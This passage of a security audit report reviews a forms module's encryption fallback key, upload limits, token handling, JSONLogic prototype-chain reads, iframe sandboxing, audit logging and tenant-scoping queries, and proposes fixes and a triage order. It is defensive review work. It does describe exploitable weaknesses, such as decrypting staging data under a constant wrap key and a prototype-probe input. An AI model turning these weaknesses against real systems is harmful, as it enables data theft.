const kmsKeyId = env.FORMS_ENCRYPTION_KMS_KEY_ID ?? ''
return new DevDeterministicKmsAdapter(kmsKeyId || 'forms-dev-fallback-key-id')
```

```ts
this.wrapKey = createHash('sha256').update(`forms-enc-v1::${kmsKeyId}`).digest()
```

The production guard is good and deliberate. The gap is everything that is *not* `NODE_ENV=production`:
a staging or UAT environment holding real data, or any deployment that forgets the variable, wraps its
per-org DEKs under `sha256("forms-enc-v1::forms-dev-fallback-key-id")` — a constant recoverable from
this file. A leaked staging dump is plaintext to anyone who can read the repository.

**Why the surrounding code does not mitigate it.** Nothing logs the choice; the fallback is silent
and the ciphertext is indistinguishable from a properly wrapped one.

**Minimal fix.** Drop the `|| 'forms-dev-fallback-key-id'` default so a dev environment must set
`FORMS_ENCRYPTION_KMS_KEY_ID` explicitly, and emit a `logger.warn` (once) naming the adapter in use.

---

# Low

**L1 — No per-submission upload budget, and uploads are accepted after submit.**
`api/public/submissions/[id]/attachments/route.ts` / `attachment-service.ts:110-160` check MIME and
per-file size but never the *count* of attachments on a submission, and never the submission status.
A participant holding a valid 24-hour access token (`distribution-token.ts:30`) can upload 10 MiB
files indefinitely, including long after submitting. Bytes land in `payload_inline` — a Postgres
`bytea` column — so this is database, not object-store, growth. *Fix:* count existing
`kind='user_upload'` rows for the submission (and, when `x-om-multiple` is false, for the field) and
cap; reject when `submission.status` is `submitted`/`archived`.

**L2 — Unbounded client JSON persisted in `submit_metadata`, and the participant IP stored in
plaintext.** `api/runtime-helpers.ts:57-70` spreads `clientMetadata` into the stored bag before
adding the server-derived keys. Server keys correctly win (`ip`, `userAgent`, `serverSubmittedAt`
are written after the spread, so they cannot be forged), but everything else the client sends is
persisted verbatim into a `jsonb` column with no schema — `submissionSubmitInputSchema`
(`validators.ts:96-99`) types it `z.record(z.unknown())`. The `ip` itself is personal data stored
unencrypted while the answers beside it are envelope-encrypted. *Fix:* validate
`submit_metadata` against a small closed schema, or drop it and keep only server-derived fields;
consider routing `submit_metadata` through the global encryption pipeline, which `encryption.ts:12-15`
already anticipates.

**L3 — Invitation tokens travel in the URL path.** `/i/<raw-token>` (`frontend/i/[token]/`) and
`GET /api/forms/public/invitations/<raw-token>` put a 256-bit bearer capability in a path segment:
browser history, any intermediary access log, and the server's own request log. Cross-origin
`Referer` leakage is genuinely mitigated — `apps/mercato/next.config.ts:80` sets
`Referrer-Policy: strict-origin-when-cross-origin`, so third parties see only the origin — which is
why this is Low. *Fix:* nothing cheap; consider accepting the token as a POST body or fragment on the
landing page and exchanging it for the access token immediately, and ensure the module's request
logging does not capture the path.

**L4 — `resolveVar` walks the prototype chain.** `services/jsonlogic-evaluator.ts:211-219` splits on
`.` and indexes without guarding `__proto__` / `constructor` / `prototype`, so
`{"var":"constructor.name"}` resolves to a host object. Not exploitable today: every result is
funnelled through `Boolean(...)` (`:65`) or a numeric/string comparison, nothing is invoked, and
nothing is assigned — so it is a read-only probe with no sink. The op whitelist (`:31-46`), the node
cap (256) and the depth cap (32) are all sound. *Fix:* skip a segment set of
`['__proto__','constructor','prototype']` in the loop — three lines, removes the class of problem
before someone adds a sink.

**L5 — The embed loader injects an unsandboxed iframe.**
`api/public/embed-loader/route.ts:55-64` sets `src`, `title`, `loading` and styles but no
`sandbox` and no `referrerpolicy`. An unsandboxed cross-origin frame may initiate top-level
navigation of the host page (with a user gesture). The `postMessage` handling is otherwise exemplary
— strict `event.origin === origin`, a `om-forms:` type prefix, an exact type match, a
`contentWindow === event.source` binding and a clamped height (`:73-96`). *Fix:* add
`sandbox="allow-forms allow-scripts allow-same-origin"` and `referrerpolicy="no-referrer"` to the
injected iframe.

**L6 — Batched access-audit events live only in process memory.**
`services/access-audit-logger.ts:11-28` buffers events when `FORMS_ACCESS_AUDIT_BATCH_MS > 0` and
flushes on a timer, swallowing failures ("An audit write MUST NEVER break the read it accompanies").
A crash or a deploy between flushes silently loses the audit trail for those reads — including the
compliance-relevant admin reads this logger exists to record. *Fix:* keep the fail-soft posture but
flush on `beforeExit`/`SIGTERM`, and `reportError` on a dropped batch so the loss is visible.

---

# Nit

**N1 — `runner/tamper-check.ts` documents a mitigation that is not wired to the path that persists.**
Its header says "The public submission endpoint re-runs the evaluator against the `(answers, hidden)`
payload… and the route rejects the submission with 422". The only caller of `checkSubmissionTamper`
is `api/[id]/run/submissions/route.ts:96` — the `@deprecated` in-app route that persists nothing.
`api/public/submissions/[id]/submit/route.ts` performs no tamper check. This costs nothing today
(that route accepts no ending key and no hidden values — see "verified NOT a problem"), but the
comment will mislead the next reader into believing R-3 is covered on the public path.

**N2 — `public_slug` uniqueness is per-organization while the lookup is global.** The index is
`create unique index "forms_distribution_org_public_slug_unique" on "forms_distribution"
("organization_id", "public_slug") where "public_slug" is not null`
(`migrations/Migration20260520120000_forms.ts:11`), yet `resolveBySlug`
(`services/distribution-service.ts:169-172`) and `getEmbedPolicyBySlug` (`:151-154`) query with no
scope. A duplicate slug across two organizations would make `findOne` return an arbitrary row. Not
reachable in practice — slugs are always server-minted with 128 bits of entropy
(`distribution-token.ts:151-153`; `commands/distribution.ts:187` regenerates on the unique violation)
— but the invariant the code relies on is not the one the database enforces. A globally-unique
partial index would close the gap for free.

**N3 — The two expression engines disagree about the grammar.**
`schema/jsonlogic-grammar.ts:23-30` allows `if`, `not`, `+`, `-`, `*`, `/`, `%`; the visibility
evaluator's whitelist (`services/jsonlogic-evaluator.ts:31-46`) does not. A schema that validates at
authoring time therefore throws `UNSUPPORTED_OP` at visibility-evaluation time, which
`evaluateJsonLogic` swallows into `false` (`:63-68`) — fail-closed, so a field silently stays hidden
rather than leaking. Safe direction, confusing behaviour; worth either aligning the sets or
documenting that `x-om-visibility-if` is a strict subset of the grammar.

---

# Verified NOT a problem

Checked against the order's eight items and cleared, so the parent does not re-check:

**Tokens (item 2).**
- The submission access token is a well-built stateless capability: HMAC-SHA256 over a
  base64url-segmented payload, secret from `FORMS_DISTRIBUTION_TOKEN_SECRET` (falling back to
  `JWT_SECRET`) and **throwing** when unset (`distribution-token.ts:52-58`), expiry parsed and
  checked before signature (`:107-109`), length-guarded `timingSafeEqual` comparison (`:113-116`).
  Org and tenant are genuinely never encoded in it and are re-derived from the persisted submission
  (`lib/runtime-principal.ts:53-64`) — the R-2d-4 invariant holds.
- A present-but-invalid bearer token does **not** fall through to customer auth
  (`runtime-principal.ts:68-70`), so an attacker cannot downgrade a failed token to a session.
- Personal invitation tokens: 256-bit `randomBytes(32).toString('base64url')`, only the SHA-256 hash
  persisted (`token_hash`), lookup is a hash equality so there is no meaningful timing oracle
  (`distribution-token.ts:136-146`, `distribution-service.ts:186-192`). Terminal statuses and
  `expiresAt` are enforced (`assertInvitationUsable`, `:469-478`).
- `api/form-submissions/[id]/resume-token/route.ts` is clean: session required, submission scoped by
  org **and** tenant (`:84-89`), an **active actor row required** (`:93-102`, 403 `NO_ACTOR`),
  HMAC + `timingSafeEqual` + TTL (`:45-65`). Note it has no consumer anywhere in the module —
  `verifyResumeToken` is exported and never imported — so it is currently dead surface, not a hole.
- `refreshAccessToken` slides the TTL on autosave but re-signs the same `(submissionId,
  invitationId, role)` triple, so it cannot widen a capability.

**Public-route tenant derivation (item 1).** Every `public/submissions/**` handler derives
`organizationId`/`tenantId` from the persisted row and passes them down; none accepts them from the
client. Cross-*tenant* access on those routes is correctly refused. C2 is an intra-organization
authorisation gap, not a scoping one.

**Uploads (item 4).** Size ceilings are genuinely server-authoritative and take the **smaller** of
field cap and env ceiling (`upload-validation.ts:66-93`); the field config is read from the
submission's pinned version, never from the client (`attachment-helpers.ts:35-75`), and both reads
there are org+tenant scoped. No path traversal: stored names are never used as filesystem paths
(bytes live in `payload_inline`), and the download `Content-Disposition` filename is
quote/backslash/CRLF-sanitised in all three streaming handlers. `AttachmentService.readUpload`
(`:168-194`) re-derives scope from the submission and pins `kind: 'user_upload'` and
`removedAt: null`, so a snapshot PDF cannot be fetched through the user-upload route. The scanner is
advisory-by-default but is honestly labelled "SAFE-BY-DECLARATION ONLY" and does block when a real
scanner is injected (`attachment-service.ts:126-137`).

**Embedding (item 5).** `lib/embed-frame-policy.ts` is correct: fails closed to
`frame-ancestors 'none'` for an absent bag, `enabled: false`, or an empty allowlist
(`:117-122`); origins are strictly normalised — scheme+host+optional port only, no userinfo, no
path/query/fragment, https required except `localhost`/`127.0.0.1`/`[::1]` (`:50-73`); no wildcard
and no `'self'`; the Zod layer reuses the same helper so save-time and runtime agree
(`validators.ts:326-330`). `postMessage` handling in the loader is strict (see L5). The `/embed/:slug`
page is currently **unframable cross-origin** regardless, because `apps/mercato/next.config.ts:14,82`
applies `frame-ancestors 'self'` + `X-Frame-Options: SAMEORIGIN` to `/:path*` with no `/embed/`
carve-out — verified directly, and already documented in `frontend/embed/[slug]/page.meta.ts:9-34`.
That is the fail-closed direction. **Carry-forward warning:** the carve-out and the dynamic
per-distribution header are both load-bearing; shipping the carve-out without the header would make
`/embed/:slug` framable by anyone.

**Expression evaluation (item 6).** No sandbox escape: both evaluators are hand-rolled, operate on a
one-key-per-node structure, whitelist operators by name and never construct, invoke, or assign
anything (`jsonlogic-evaluator.ts:82-192`, `form-logic-evaluator.ts:463-616`). Prototype *pollution*
is impossible — there is no write path (the read-side probe is L4). DoS bounds exist and are
enforced: depth 32 / 256 nodes for visibility, depth 64 / 1024 nodes for the reactive core, plus
cycle detection on computed variables (`form-logic-evaluator.ts:239`). Arithmetic coerces through
`Number()` with `|| 0`, so no string-repetition blowup. The residual expression risk is Ajv `pattern`
ReDoS, filed as M6.

**Data protection (item 7).** Answers really are encrypted at rest: AES-256-GCM with a random 12-byte
IV per record and an auth tag, under a per-organization DEK that is itself wrapped
(`encryption-service.ts:61,104-120,314-318`), with a genuine production guard refusing the dev
adapter (`:246-253`; residual gap is M7). Invitation recipient PII is routed through the global
pipeline (`encryption.ts:21-29`) and read back with `findOneWithDecryption`
(`distribution-service.ts:196-202`) — the one place in the module where the platform pipeline is
required, and it is used correctly. Logging is careful: the tampering marker carries ids and dropped
**key names** only, never values (`lib/log-redaction.ts:78-91`), and `wrapLogger` scrubs
payload-shaped keys. No token or secret is logged anywhere; the CAPTCHA verifier explicitly forbids it
and does not. The module registers **no search indexer** (no `search.ts`, no `registerIndexer`/
`indexEntity` reference anywhere under `forms/`), so there is no plaintext copy in the query or
search index — the "search index" leg of the erasure question is moot. Erasure completeness is M5.

**Command undo handlers.** The `{ id: before.id }` lookups flagged by the §8 sweep in
`commands/{form,form-version,distribution,invitation}.ts` are `captureAfter` snapshot reads (the id
was just produced by the scoped handler) and `undo` handlers reading ids out of a stored audit-log
entry. This is exactly the reference module's pattern — `customers/commands/comments.ts:277`,
`customers/commands/deals.ts:993`, `customers/commands/interactions.ts:791` all do the same — so it is
house-consistent, and re-scoping it in forms alone would be a divergence, not a fix.

**Admin route guards.** All 18 authenticated routes carry `requireAuth: true` plus a `requireFeatures`
gate drawn from `acl.ts`, with sensible granularity (`forms.view` read, `forms.design` author,
`forms.distribute` distribute, `forms.submissions.{manage,export,anonymize}`). `setup.ts:5-12` grants
the set to `admin` only. Wildcard handling in `by-key/[key]/active:99` checks `features.includes('*')`
explicitly, per the house rule.

**Hidden fields are not attacker-injectable on the public path.** `x-om-hidden-fields` values reach
only the in-app runner via `pickHiddenFromUrl` (`frontend/forms/[id]/run/page.tsx:64`, now
auth-required). The public transport carries none — `useFormRunner.ts:180-183` passes `hidden: {}`
and relies on declared defaults — so a respondent cannot forge a hidden value to steer jumps or
scores on `/f/:slug`.

**Org-only child entities.** `FormSubmissionActor`, `FormSubmissionRevision`, `FormAttachment`,
`FormAccessAudit` and `FormsEncryptionKey` carry `organization_id` but no `tenant_id`. Queries on them
are scoped by organization only. That is sound — an organization belongs to exactly one tenant and
its id is a globally unique UUID, so org scoping implies tenant scoping — and the parent
`FormSubmission` is always scoped by both. Worth knowing, not worth changing.

**Optimistic locking / concurrency.** `save` and `submit` both take a `PESSIMISTIC_WRITE` lock and
enforce `currentRevisionId === base_revision_id` with a 409 (`submission-service.ts:474-520,
671-695`); `reserveResponseSlot` locks the distribution row before incrementing so the response cap is
atomic (`distribution-service.ts:338-355`), and the public submit route reserves **before** mutating
(`submit/route.ts:88-94`), which is the ordering its comment claims.

---

## §8 — module-wide tenant/organization scoping sweep

Command (run from `packages/core/src/modules/forms`, `__tests__` excluded), flagging any
`em/trx.find|findOne|findAll|count|findAndCount|nativeUpdate|nativeDelete` whose filter omits
`tenantId` on a tenant-bearing entity (`Form`, `FormVersion`, `FormSubmission`, `FormDistribution`,
`FormConsentRecord`, `FormInvitation`) or omits `organizationId` on any forms entity:

```
total em.find*/native* call sites scanned: 136
flagged (missing tenantId on a tenant-bearing entity, or missing organizationId): 41

api/forms/subjects/[subjectType]/[subjectId]/consents/route.ts:118  FormConsentRecord   NO_TENANT NO_ORG
      where: FormConsentRecord, where, { orderBy: { signedAt: 'desc' }, }
api/route.ts:112  Form                     NO_TENANT NO_ORG
      where: Form, where, { orderBy: { updatedAt: 'desc' }, limit: pageSize, offset: (page - 1) * pageSize, }
commands/distribution.ts:225  FormDistribution         NO_TENANT NO_ORG      where: { id: result.distributionId }
commands/distribution.ts:245  FormDistribution         NO_TENANT NO_ORG      where: { id: after.id }
commands/distribution.ts:354  FormDistribution         NO_TENANT NO_ORG      where: { id: result.distributionId }
commands/distribution.ts:378  FormDistribution         NO_TENANT NO_ORG      where: { id: before.id }
commands/distribution.ts:444  FormDistribution         NO_TENANT NO_ORG      where: { id: result.distributionId }
commands/distribution.ts:468  FormDistribution         NO_TENANT NO_ORG      where: { id: before.id }
commands/form-version.ts:174  FormVersion              NO_TENANT NO_ORG      where: { formId: form.id }, { orderBy: { versionNumber: 'desc' } }
commands/form-version.ts:255  FormVersion              NO_TENANT NO_ORG      where: { id: result.versionId }
commands/form-version.ts:277  FormVersion              NO_TENANT NO_ORG      where: { id: after.id }
commands/form-version.ts:386  FormVersion              NO_TENANT NO_ORG      where: { id: result.versionId }
commands/form-version.ts:415  FormVersion              NO_TENANT NO_ORG      where: { id: before.id }
commands/form-version.ts:582  FormVersion              NO_TENANT NO_ORG      where: { id: result.versionId }
commands/form-version.ts:617  FormVersion              NO_TENANT NO_ORG      where: { id: after.id }
commands/form-version.ts:621  Form                     NO_TENANT NO_ORG      where: { id: version.formId }
commands/form-version.ts:696  Form                     NO_TENANT NO_ORG      where: { id: version.formId }
commands/form-version.ts:715  FormVersion              NO_TENANT NO_ORG      where: { id: result.versionId }
commands/form-version.ts:744  FormVersion              NO_TENANT NO_ORG      where: { id: before.id }
commands/form.ts:121  Form                           NO_TENANT NO_ORG      where: { id: result.formId }
commands/form.ts:141  Form                           NO_TENANT NO_ORG      where: { id: after.id }
commands/form.ts:235  Form                           NO_TENANT NO_ORG      where: { id: result.formId }
commands/form.ts:262  Form                           NO_TENANT NO_ORG      where: { id: before.id }
commands/form.ts:321  Form                           NO_TENANT NO_ORG      where: { id: result.formId }
commands/form.ts:348  Form                           NO_TENANT NO_ORG      where: { id: before.id }
commands/form.ts:403  Form                           NO_TENANT NO_ORG      where: { id: result.formId }
commands/form.ts:430  Form                           NO_TENANT NO_ORG      where: { id: before.id }
commands/invitation.ts:235  FormInvitation           NO_TENANT NO_ORG      where: { id: { $in: ids } }
commands/invitation.ts:329  FormInvitation           NO_TENANT NO_ORG      where: { id: before.id }
commands/invitation.ts:408  FormInvitation           NO_TENANT NO_ORG      where: { id: before.id }
lib/runtime-principal.ts:53  FormSubmission           NO_TENANT NO_ORG      where: { id: submissionId, deletedAt: null }
services/analytics-service.ts:168  FormSubmission     NO_TENANT NO_ORG      where: where as never, { orderBy: …, limit }
services/anonymize-service.ts:51  FormSubmission      NO_TENANT NO_ORG      where: { id: submissionId }
services/anonymize-service.ts:62  FormVersion         NO_TENANT NO_ORG      where: { id: submission.formVersionId }
services/anonymize-service.ts:73  FormSubmissionRevision          NO_ORG   where: { submissionId: submission.id }, { orderBy: … }
services/consent-record-service.ts:107  FormConsentRecord  NO_TENANT       where: { submissionId, organizationId: args.organizationId, consentFieldKey }
services/distribution-service.ts:151  FormDistribution  NO_TENANT NO_ORG   where: { publicSlug: slug, deletedAt: null }
services/distribution-service.ts:169  FormDistribution  NO_TENANT NO_ORG   where: { publicSlug: slug, deletedAt: null }
services/distribution-service.ts:189  FormInvitation    NO_TENANT NO_ORG   where: { tokenHash, deletedAt: null }
subscribers/forms-consent-projector.ts:53  FormSubmission  NO_TENANT NO_ORG  where: { id: payload.submissionId, deletedAt: null }
subscribers/forms-pdf-snapshot.ts:54  FormSubmission      NO_TENANT NO_ORG  where: { id: payload.submissionId, deletedAt: null }
```

Triage of all 41 — **one real defect**:

| Group | Sites | Verdict |
|---|---|---|
| `api/route.ts:112`, `consents/route.ts:118`, `analytics-service.ts:168` | 3 | **False positive.** The `where` object is built above the call with both keys — `api/route.ts:92-95` (`{ tenantId, organizationId, deletedAt: null }`), `consents/route.ts:109-114`, `analytics-service.ts:159-163`. The regex could not see through the variable. |
| `commands/*.ts` `captureAfter` / `undo` | 26 | **Accepted — house pattern.** Post-write snapshot reads of an id the scoped handler just produced, and undo handlers reading an id out of a scoped audit-log entry. Identical to `customers/commands/{comments,deals,interactions}.ts`. |
| `distribution-service.ts:151,169,189` | 3 | **By design and documented** (`:8-13`): the two global lookups are by 128-bit random `public_slug` and by SHA-256 `token_hash`; scope is taken from the found row and used for every subsequent query. See N2 for the index caveat. |
| `lib/runtime-principal.ts:53`, `subscribers/*.ts:53,54` | 3 | **By design.** These are the places that *derive* scope — from the persisted row (R-2d-4) or from an internally-emitted event payload. Adding a filter here would be circular. |
| `anonymize-service.ts:73` (`FormSubmissionRevision`), `consent-record-service.ts:107` | 2 | **Accepted.** Both are keyed on `submissionId`, a UUID primary key of an already-scope-verified parent; `FormSubmissionRevision` carries no `tenant_id` column at all. |
| `anonymize-service.ts:51` + `:62` | 2 | **REAL — this is C1.** The caller has the scope, validates it, and does not pass it; the service does not filter. Cross-tenant irreversible destruction. |

No raw `em.find`/`em.findOne` against a globally-pipeline-encrypted entity was found where
`findWithDecryption`/`findOneWithDecryption` is required: the only such entity is `FormInvitation`
(`recipient_email`, `recipient_name` — `encryption.ts:21-29`), and the one read that needs the
plaintext uses `findOneWithDecryption` correctly (`distribution-service.ts:196-202`). Every other
`FormInvitation` read touches only status/id/`submissionId` fields, for which the raw read is right.
`forms_form_submission_revision.data` is deliberately outside the global pipeline and handled by
`EncryptionService` directly, as `encryption.ts:6-11` states.

---

## Suggested triage order

1. **C1** — 10 lines, no design decision, destroys data today.
2. **C2 + H2** — one coherent change: make `getCurrent`/`readUpload`/`ensureSnapshot`/`submit`
   require an actor, and give portal principals a real role. These four routes are the module's
   entire portal read surface.
3. **H1** — scheme-check `redirectUrl` and `x-om-redirect-url`; reuse `normalizeEmbedOrigin`'s shape.
4. **H3, H4, M1** — the anonymous abuse surface; best fixed together since they share the limiter.
5. **M2, M3, M5, M6, M7** — each independent and small.
6. **M4, L1–L6, N1–N3** — cleanup, and the doc corrections that stop the next reader trusting a
   mitigation that is not there.
